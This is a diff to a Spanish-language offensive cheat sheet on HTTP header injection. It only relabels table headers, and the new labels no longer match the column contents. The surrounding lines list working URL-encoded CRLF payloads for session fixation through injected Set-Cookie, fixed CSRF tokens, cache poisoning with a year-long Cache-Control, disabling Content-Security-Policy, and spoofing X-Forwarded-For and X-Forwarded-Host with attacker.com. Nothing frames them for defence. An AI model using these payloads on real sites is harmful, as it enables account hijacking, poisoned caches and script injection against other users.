@@ -21,7 +21,7 @@ linked:
 
 ## Set-Cookie Injection
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Inject session cookie | `?url=ok%0d%0aSet-Cookie:%20session=ATTACKER_SET` | Session fixation. |
 | Inject CSRF token | `%0d%0aSet-Cookie:%20csrf_token=KNOWN_VALUE` | Predictable token. |
@@ -55,7 +55,7 @@ ___
 
 ## Cache Poisoning via Header
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | Cache stores response with injected header. All subsequent users con same cache key see poisoned headers. | Mass impact. |
 | Inject Cache-Control | `%0d%0aCache-Control:%20public,%20max-age=31536000` | Force cache. |
@@ -75,7 +75,7 @@ ___
 
 ## CSP Bypass via Injected Header
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Override CSP | `%0d%0aContent-Security-Policy:%20default-src%20*` | Disable CSP. |
 | Inject permissive policy | `%0d%0aCSP:%20script-src%20'unsafe-inline'%20*` | Allow inline scripts. |
@@ -93,7 +93,7 @@ ___
 
 ## Custom Header Injection (X-*)
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Inject `X-Forwarded-For` | `%0d%0aX-Forwarded-For:%20127.0.0.1` | If backend reads → IP spoof. |
 | Inject `X-Forwarded-Host` | `%0d%0aX-Forwarded-Host:%20attacker.com` | HHI. |
